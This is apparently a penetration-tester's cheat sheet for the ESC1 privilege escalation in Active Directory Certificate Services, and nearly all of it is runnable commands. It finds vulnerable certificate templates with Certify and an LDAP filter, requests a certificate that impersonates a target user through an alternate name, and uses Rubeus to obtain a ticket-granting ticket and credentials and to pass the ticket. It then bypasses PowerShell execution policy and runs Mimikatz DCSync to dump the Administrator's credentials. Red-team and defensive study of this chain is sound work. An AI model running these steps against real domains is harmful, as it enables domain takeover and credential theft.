# ESC1 Privilege Escalation

# perform vuln cert enumeration
.\Certify.exe find /vulnerable 

Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local' | fl

# request certificate using alt SAN
# for $CA use HOSTNAME\CA
.\Certify.exe request /ca:$CA /template:$TEMPLATE /altname:$TARGET@$DOMAIN

# copy cert.pem from output to linux machine and convert it 
# windows (if openssl is installed)
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
# linux
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# get TGT using pfx
.\Rubeus.exe asktgt /user:$TARGET /certificate:cert.pfx /getcredentials /nowrap

# create logon session using rubeus
.\Rubeus.exe createnetonly /program:powershell.exe /show

# pass the ticket
.\Rubeus.exe ptt /ticket:$TICKET

# DCSYNC
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"lsadump::dcsync /user:DOMAIN\Administrator"'
